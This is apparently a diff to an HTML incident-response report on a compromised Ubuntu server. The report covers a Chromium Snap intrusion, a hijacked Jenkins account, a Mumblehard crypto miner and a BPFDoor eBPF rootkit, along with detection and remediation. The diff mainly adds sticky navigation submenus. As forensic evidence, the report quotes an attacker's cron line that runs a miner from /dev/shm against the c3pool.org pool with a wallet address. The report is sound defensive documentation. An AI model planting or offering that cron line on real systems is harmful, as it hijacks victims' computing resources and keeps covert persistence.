@@ -124,6 +124,35 @@
             background: rgba(255, 255, 255, 0.2);
         }
 
+        /* Sticky Submenu */
+        .sticky-submenu {
+            position: sticky;
+            top: 80px; /* Adjust based on hero height */
+            background: rgba(15, 15, 35, 0.9);
+            backdrop-filter: blur(20px);
+            z-index: 90;
+            padding: 10px 0;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .sticky-submenu-item {
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+            font-weight: normal;
+        }
+
+        .sticky-submenu-item.active {
+            color: white;
+            font-weight: bold;
+            background: rgba(255, 255, 255, 0.2);
+        }
+
         /* General Section Styling */
         .section {
             max-width: 1200px;
@@ -451,20 +480,26 @@
     <div class="main-content">
         <section class="section" id="executive-summary">
             <h2>📋 Executive Summary</h2>
+            <div class="sticky-submenu" id="executive-summary-submenu">
+                <a href="#initial-compromise" class="sticky-submenu-item">Initial Compromise</a>
+                <a href="#privilege-escalation" class="sticky-submenu-item">Privilege Escalation</a>
+                <a href="#crypto-mining" class="sticky-submenu-item">Crypto Mining</a>
+                <a href="#stealth-access" class="sticky-submenu-item">Stealth Access</a>
+            </div>
             <div class="info-grid">
-                <div class="info-card">
+                <div class="info-card" id="initial-compromise">
                     <h3>🎯 Initial Compromise</h3>
                     <p>Chromium Snap package vulnerability exploitation led to malicious payload delivery</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="privilege-escalation">
                     <h3>🔐 Privilege Escalation</h3>
                     <p>Pre-existing Jenkins user account hijacked for establishing persistence</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="crypto-mining">
                     <h3>💰 Crypto Mining</h3>
                     <p>Mumblehard malware deployed to <span class="highlight">/dev/shm/duet</span> targeting c3pool.org</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="stealth-access">
                     <h3>🕵️ Stealth Access</h3>
                     <p>BPFDoor rootkit implanted for kernel-level persistence and backdoor access</p>
                 </div>
@@ -477,7 +512,11 @@
 
         <section class="section" id="system-info">
             <h2>💻 Compromised System Details</h2>
-            <div class="stats-grid">
+            <div class="sticky-submenu" id="system-info-submenu">
+                <a href="#system-details" class="sticky-submenu-item">System Details</a>
+                <a href="#key-cves" class="sticky-submenu-item">Key CVEs</a>
+            </div>
+            <div class="stats-grid" id="system-details">
                 <div class="stat-card">
                     <span class="stat-number">Ubuntu</span>
                     <div>24.04.2 LTS Noble</div>
@@ -496,7 +535,7 @@
                 </div>
             </div>
 
-            <h3>🔍 Key CVEs Involved</h3>
+            <h3 id="key-cves">🔍 Key CVEs Involved</h3>
             <div class="info-grid">
                 <div class="info-card">
                     <span class="status-badge critical">CVE-2021-3773</span>
@@ -515,43 +554,51 @@
 
         <section class="section" id="attack-timeline">
             <h2>⏱️ Attack Chain Timeline</h2>
+            <div class="sticky-submenu" id="attack-timeline-submenu">
+                <a href="#initial-access" class="sticky-submenu-item">Initial Access</a>
+                <a href="#privilege-escalation-timeline" class="sticky-submenu-item">Privilege Escalation</a>
+                <a href="#payload-deployment" class="sticky-submenu-item">Payload Deployment</a>
+                <a href="#persistence" class="sticky-submenu-item">Persistence</a>
+                <a href="#stealth-c2" class="sticky-submenu-item">Stealth & C2</a>
+                <a href="#secondary-access" class="sticky-submenu-item">Secondary Access</a>
+            </div>
             <div class="timeline">
-                <div class="timeline-item">
+                <div class="timeline-item" id="initial-access">
                     <div class="timeline-marker">1</div>
                     <div class="timeline-content">
                         <h3>Initial Access</h3>
                         <p>Chromium Snap vulnerability exploited to drop malicious loader</p>
                     </div>
                 </div>
-                <div class="timeline-item">
+                <div class="timeline-item" id="privilege-escalation-timeline">
                     <div class="timeline-marker">2</div>
                     <div class="timeline-content">
                         <h3>Privilege Escalation</h3>
                         <p>Jenkins user account hijacked as execution context</p>
                     </div>
                 </div>
-                <div class="timeline-item">
+                <div class="timeline-item" id="payload-deployment">
                     <div class="timeline-marker">3</div>
                     <div class="timeline-content">
                         <h3>Payload Deployment</h3>
                         <p>Mumblehard Miner & BPFDoor backdoor installed via scheduled tasks</p>
                     </div>
                 </div>
-                <div class="timeline-item">
+                <div class="timeline-item" id="persistence">
                     <div class="timeline-marker">4</div>
                     <div class="timeline-content">
                         <h3>Persistence</h3>
                         <p>Cron job created for continuous mining operations</p>
                     </div>
                 </div>
-                <div class="timeline-item">
+                <div class="timeline-item" id="stealth-c2">
                     <div class="timeline-marker">5</div>
                     <div class="timeline-content">
                         <h3>Stealth & C2</h3>
                         <p>BPFDoor rootkit + data exfiltration to mining pool</p>
                     </div>
                 </div>
-                <div class="timeline-item">
+                <div class="timeline-item" id="secondary-access">
                     <div class="timeline-marker">6</div>
                     <div class="timeline-content">
                         <h3>Secondary Access</h3>
@@ -563,25 +610,31 @@
 
         <section class="section" id="malware-analysis">
             <h2>🦠 Malware Artifacts Discovered</h2>
+            <div class="sticky-submenu" id="malware-analysis-submenu">
+                <a href="#mumblehard-miner" class="sticky-submenu-item">Mumblehard Miner</a>
+                <a href="#bpfdoor-rootkit" class="sticky-submenu-item">BPFDoor Rootkit</a>
+                <a href="#malicious-cron-job" class="sticky-submenu-item">Malicious Cron Job</a>
+                <a href="#rootkit-detection" class="sticky-submenu-item">Rootkit Detection</a>
+            </div>
             <div class="malware-list">
-                <div class="malware-item">
+                <div class="malware-item" id="mumblehard-miner">
                     <h3>💰 Mumblehard Miner</h3>
                     <p>Crypto mining malware</p>
                     <span class="status-badge critical">HIGH IMPACT</span>
                 </div>
-                <div class="malware-item">
+                <div class="malware-item" id="bpfdoor-rootkit">
                     <h3>🚪 BPFDoor Rootkit</h3>
                     <p>Kernel-level backdoor</p>
                     <span class="status-badge critical">STEALTH</span>
                 </div>
             </div>
 
-            <h3>🔍 Evidence - Malicious Cron Job</h3>
+            <h3 id="malicious-cron-job">🔍 Evidence - Malicious Cron Job</h3>
             <div class="code-block">
 * * * * * /usr/bin/flock -n /var/tmp/verl.lock -c 'cd /dev/shm/duet; exec ./app -o auto.c3pool.org:19999 -u 49SxJeWLPqcPKzqRfPzLoMW17NiYuSaaMdgpXLaSqY8H2QwPdi5iKBTZNkQpFfS5xpjRzwjpYhD7jFHab87VuW5xTpgNXZX --rig-id cpuaa90ef09 -k &'
             </div>
 
-            <h3>🔍 Evidence - Rootkit Detection</h3>
+            <h3 id="rootkit-detection">🔍 Evidence - Rootkit Detection</h3>
             <div class="code-block">
 /proc/1656590/stack:[&lt;0&gt;] unix_seqpacket_recvmsg+0x43/0x70
 /proc/17300/stack:[&lt;0&gt;] unix_seqpacket_recvmsg+0x43/0x70
@@ -601,18 +654,23 @@
 
         <section class="section" id="bpfdoor-analysis">
             <h2>🕵️ BPFDoor Rootkit Analysis</h2>
+            <div class="sticky-submenu" id="bpfdoor-analysis-submenu">
+                <a href="#detection-method" class="sticky-submenu-item">Detection Method</a>
+                <a href="#technology" class="sticky-submenu-item">Technology</a>
+                <a href="#ebpf-programs" class="sticky-submenu-item">eBPF Programs</a>
+            </div>
             <div class="info-grid">
-                <div class="info-card">
+                <div class="info-card" id="detection-method">
                     <h3>🎯 Detection Method</h3>
                     <p>Kernel stack analysis revealing <span class="highlight">unix_seqpacket_recvmsg</span> hooks</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="technology">
                     <h3>🔧 Technology</h3>
                     <p>eBPF-based kernel module for stealth operations</p>
                 </div>
             </div>
 
-            <h3>📊 eBPF Programs Identified</h3>
+            <h3 id="ebpf-programs">📊 eBPF Programs Identified</h3>
             <div class="code-block">
 2039: cgroup_skb  name sd_fw_ingress  tag 6deef7357e7b4530  gpl
       loaded_at 2025-06-08T14:52:25+0900  uid 0
@@ -641,28 +699,36 @@
 
         <section class="section" id="forensic-methodology">
             <h2>🔬 Forensic Investigation Methodology</h2>
+            <div class="sticky-submenu" id="forensic-methodology-submenu">
+                <a href="#vulnerability-scanning" class="sticky-submenu-item">Vulnerability Scanning</a>
+                <a href="#rootkit-detection-methodology" class="sticky-submenu-item">Rootkit Detection</a>
+                <a href="#process-analysis" class="sticky-submenu-item">Process Analysis</a>
+                <a href="#scheduled-task-audit" class="sticky-submenu-item">Scheduled Task Audit</a>
+                <a href="#login-audits" class="sticky-submenu-item">Login Audits</a>
+                <a href="#network-analysis" class="sticky-submenu-item">Network Analysis</a>
+            </div>
             <div class="info-grid">
-                <div class="info-card">
+                <div class="info-card" id="vulnerability-scanning">
                     <h3>🔍 Vulnerability Scanning</h3>
                     <p>System-wide CVE identification and package analysis</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="rootkit-detection-methodology">
                     <h3>🕵️ Rootkit Detection</h3>
                     <p>Kernel stack analysis and eBPF program enumeration</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="process-analysis">
                     <h3>📊 Process Analysis</h3>
                     <p>Active/passive process monitoring and network connections</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="scheduled-task-audit">
                     <h3>⏰ Scheduled Task Audit</h3>
                     <p>Cron job analysis and persistence mechanism identification</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="login-audits">
                     <h3>🔐 Login Audits</h3>
                     <p>Authentication log analysis and user account review</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="network-analysis">
                     <h3>🌐 Network Analysis</h3>
                     <p>C2 communication patterns and external connections</p>
                 </div>
@@ -680,8 +746,14 @@
 
         <section class="section" id="remediation-overview">
             <h2>🛡️ Comprehensive Remediation</h2>
+            <div class="sticky-submenu" id="remediation-overview-submenu">
+                <a href="#malware-removal" class="sticky-submenu-item">Malware Removal</a>
+                <a href="#package-restoration" class="sticky-submenu-item">Package Restoration</a>
+                <a href="#system-hardening" class="sticky-submenu-item">System Hardening</a>
+                <a href="#verification" class="sticky-submenu-item">Verification</a>
+            </div>
             <div class="remediation-grid">
-                <div class="remediation-card">
+                <div class="remediation-card" id="malware-removal">
                     <h3>🧹 Malware Removal</h3>
                     <ul>
                         <li>Mumblehard miner binaries purged</li>
@@ -690,7 +762,7 @@
                         <li>Jenkins user activities cleared</li>
                     </ul>
                 </div>
-                <div class="remediation-card">
+                <div class="remediation-card" id="package-restoration">
                     <h3>📦 Package Restoration</h3>
                     <ul>
                         <li>Chromium Snap package reinstalled</li>
@@ -699,7 +771,7 @@
                         <li>Python packages integrity restored</li>
                     </ul>
                 </div>
-                <div class="remediation-card">
+                <div class="remediation-card" id="system-hardening">
                     <h3>🔒 System Hardening</h3>
                     <ul>
                         <li>Firewall rules enhanced</li>
@@ -708,7 +780,7 @@
                         <li>Extended monitoring enabled</li>
                     </ul>
                 </div>
-                <div class="remediation-card">
+                <div class="remediation-card" id="verification">
                     <h3>✅ Verification</h3>
                     <ul>
                         <li>Full system integrity check</li>
@@ -723,28 +795,36 @@
 
         <section class="section" id="lessons-learned">
             <h2>🎓 Key Lessons Learned</h2>
+            <div class="sticky-submenu" id="lessons-learned-submenu">
+                <a href="#snap-package-security" class="sticky-submenu-item">Snap Package Security</a>
+                <a href="#ebpf-rootkits" class="sticky-submenu-item">eBPF Rootkits</a>
+                <a href="#credential-exposure" class="sticky-submenu-item">Credential Exposure</a>
+                <a href="#persistence-mechanisms" class="sticky-submenu-item">Persistence Mechanisms</a>
+                <a href="#continuous-monitoring" class="sticky-submenu-item">Continuous Monitoring</a>
+                <a href="#detection-techniques" class="sticky-submenu-item">Detection Techniques</a>
+            </div>
             <div class="info-grid">
-                <div class="info-card">
+                <div class="info-card" id="snap-package-security">
                     <h3>📦 Snap Package Security</h3>
                     <p>Snap-based applications represent significant attack surfaces requiring continuous monitoring and minimal usage where possible</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="ebpf-rootkits">
                     <h3>🔧 eBPF Rootkits</h3>
                     <p>Kernel-level eBPF-based rootkits like BPFDoor are increasing in Linux environments, requiring advanced detection techniques</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="credential-exposure">
                     <h3>🔐 Credential Exposure</h3>
                     <p>Malware with C2 capabilities can leak various credentials (SSH, AnyDesk, etc.) enabling lateral movement</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="persistence-mechanisms">
                     <h3>⏰ Persistence Mechanisms</h3>
                     <p>Scheduled cron jobs remain simple but highly effective persistence mechanisms for attackers</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="continuous-monitoring">
                     <h3>📊 Continuous Monitoring</h3>
                     <p>Proactive system patching combined with SIEM monitoring is crucial for Linux production systems</p>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="detection-techniques">
                     <h3>🔍 Detection Techniques</h3>
                     <p>Multiple detection tools (rkhunter, chkrootkit, bpftool) are necessary for comprehensive threat identification</p>
                 </div>
@@ -753,36 +833,43 @@
 
         <section class="section" id="future-recommendations">
             <h2>🚀 Future Security Recommendations</h2>
+            <div class="sticky-submenu" id="future-recommendations-submenu">
+                <a href="#os-reinstallation" class="sticky-submenu-item">OS Reinstallation</a>
+                <a href="#kernel-sandboxing" class="sticky-submenu-item">Kernel Sandboxing</a>
+                <a href="#minimize-snap-usage" class="sticky-submenu-item">Minimize Snap Usage</a>
+                <a href="#kernel-updates" class="sticky-submenu-item">Kernel Updates</a>
+                <a href="#siem-monitoring" class="sticky-submenu-item">SIEM Monitoring</a>
+            </div>
             <div class="timeline">
-                <div class="timeline-item">
+                <div class="timeline-item" id="os-reinstallation">
                     <div class="timeline-marker">🔄</div>
                     <div class="timeline-content">
                         <h3>Operating System Reinstallation</h3>
                         <p>Complete clean OS installation with data backup for maximum security assurance</p>
                     </div>
                 </div>
-                <div class="timeline-item">
+                <div class="timeline-item" id="kernel-sandboxing">
                     <div class="timeline-marker">🛡️</div>
                     <div class="timeline-content">
                         <h3>Kernel-level Sandboxing</h3>
                         <p>Enable system-wide application confinement for enhanced security</p>
                     </div>
                 </div>
-                <div class="timeline-item">
+                <div class="timeline-item" id="minimize-snap-usage">
                     <div class="timeline-marker">📦</div>
                     <div class="timeline-content">
                         <h3>Minimize Snap Usage</h3>
                         <p>Reduce Snap package usage wherever possible to minimize attack surface</p>
                     </div>
                 </div>
-                <div class="timeline-item">
+                <div class="timeline-item" id="kernel-updates">
                     <div class="timeline-marker">🔄</div>
                     <div class="timeline-content">
                         <h3>Regular Kernel Updates</h3>
                         <p>Establish automated kernel update monitoring and deployment routines</p>
                     </div>
                 </div>
-                <div class="timeline-item">
+                <div class="timeline-item" id="siem-monitoring">
                     <div class="timeline-marker">📊</div>
                     <div class="timeline-content">
                         <h3>Enhanced SIEM Monitoring</h3>
@@ -794,21 +881,26 @@
 
         <section class="section" id="project-references">
             <h2>📚 Investigation Documentation</h2>
-            <h3>🔗 GitHub Repository Resources</h3>
+            <div class="sticky-submenu" id="project-references-submenu">
+                <a href="#investigation-plan" class="sticky-submenu-item">Investigation Plan</a>
+                <a href="#mitigation-procedures" class="sticky-submenu-item">Mitigation Procedures</a>
+                <a href="#detailed-issues" class="sticky-submenu-item">Detailed Issues</a>
+            </div>
+            <h3 id="investigation-plan">🔗 GitHub Repository Resources</h3>
             <div class="info-grid">
                 <div class="info-card">
                     <h3>📋 Investigation Plan</h3>
                     <p><strong>GitHub Wiki</strong><br>Comprehensive investigation architecture and methodology</p>
                     <span class="status-badge info">DOCUMENTATION</span>
                 </div>
-                <div class="info-card">
+                <div class="info-card" id="mitigation-procedures">
                     <h3>🛡️ Mitigation Procedures</h3>
                     <p><strong>GitHub Wiki</strong><br>Complete remediation and hardening procedures</p>
                     <span class="status-badge success">PROCEDURES</span>
                 </div>
             </div>
 
-            <h3>🎯 Detailed Investigation Issues</h3>
+            <h3 id="detailed-issues">🎯 Detailed Investigation Issues</h3>
             <div class="info-grid">
                 <div class="info-card">
                     <h3>Issue #1</h3>
@@ -957,6 +1049,28 @@
                     }, 100);
                 }
             }
+
+            // Sticky submenu highlighting
+            const submenuItems = document.querySelectorAll('.sticky-submenu-item');
+            const submenuSections = document.querySelectorAll('.info-card, .timeline-item, .remediation-card, h3');
+
+            const submenuObserver = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const id = entry.target.id;
+                        submenuItems.forEach(item => {
+                            item.classList.remove('active');
+                            if (item.getAttribute('href') === `#${id}`) {
+                                item.classList.add('active');
+                            }
+                        });
+                    }
+                });
+            }, { threshold: 0.5 });
+
+            submenuSections.forEach(section => {
+                submenuObserver.observe(section);
+            });
         });
     </script>
 </body>
